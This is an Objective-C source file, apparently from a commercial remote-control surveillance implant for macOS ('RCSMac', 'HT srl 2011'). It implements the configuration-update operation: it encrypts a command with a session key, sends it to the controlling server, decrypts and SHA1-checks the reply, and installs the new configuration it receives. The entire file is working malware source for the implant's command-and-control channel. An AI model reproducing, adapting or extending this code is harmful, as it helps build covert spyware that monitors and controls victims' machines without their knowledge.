/*
 * RCSMac - ConfigurationUpdate Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "ConfNetworkOperation.h"
#import "RCSICommon.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"
#import "RCSIInfoManager.h"

#import "RCSITaskManager.h"
//#import "RCSMLogger.h"
//#import "RCSMDebug.h"


@implementation ConfNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if ((self = [super init]))
    {
      mTransport = aTransport;
      
#ifdef DEBUG_CONF_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (BOOL)perform
{
#ifdef DEBUG_CONF_NOP
  infoLog(@"");
#endif
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  uint32_t command = PROTO_NEW_CONF;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
#ifdef DEBUG_CONF_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];

  if (replyData == nil)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(@"empty reply from server");
#endif
      [infoManager release];
      [commandData release];
      [outerPool release];
    
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_CONF_NOP
  infoLog(@"replyDecrypted: %@", replyDecrypted);
#endif

  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
  
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(@"exception on sha makerange (%@)", [e reason]);
#endif
      
      [infoManager release];
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_CONF_NOP
  infoLog(@"shaRemote: %@", shaRemote);
  infoLog(@"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(@"sha mismatch");
#endif

      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  if (command != PROTO_OK)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(@"No configuration available (command %d)", command);
#endif
      
      [infoManager release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
    
  uint32_t configSize = 0;
  @try
    {
      [replyDecrypted getBytes: &configSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(@"exception on configSize makerange (%@)", [e reason]);
#endif

      [infoManager logActionWithDescription: @"Corrupted configuration received"];
      [infoManager release];
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
#ifdef DEBUG_CONF_NOP
  infoLog(@"configSize: %d", configSize);
#endif
  
  if (configSize == 0)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(@"configuration size is zero!");
#endif

      [infoManager logActionWithDescription: @"Corrupted configuration received"];
      [infoManager release];

      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  NSMutableData *configData;
  
  @try
    {
      configData = [[NSMutableData alloc] initWithData:
                    [replyDecrypted subdataWithRange: NSMakeRange(8, configSize)]];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(@"exception on configData makerange (%@)", [e reason]);
#endif

      [infoManager logActionWithDescription: @"Corrupted configuration received"];
      [infoManager release];
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  //
  // Store new configuration file
  //
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  
  if ([taskManager updateConfiguration: configData] == FALSE)
    {
#ifdef DEBUG_CONF_NOP
      errorLog(@"Error while storing new configuration");
#endif
    
      [infoManager release];
      [configData release];
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  [infoManager release];
  [configData release];
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  return YES;
}

- (BOOL)sendConfAck:(BOOL)retAck
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  uint32_t command = PROTO_NEW_CONF;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
                                                             
  [commandData appendBytes: &retAck length:sizeof(int)];                                                          
  
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
#ifdef DEBUG_CONF_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];

  if (replyData == nil)
    {
#ifdef DEBUG_CONF_NOP
    errorLog(@"empty reply from server");
#endif
    [commandData release];
    [outerPool release];
    
    return NO;
    }
    
  [outerPool release];
  return YES;
}
@end
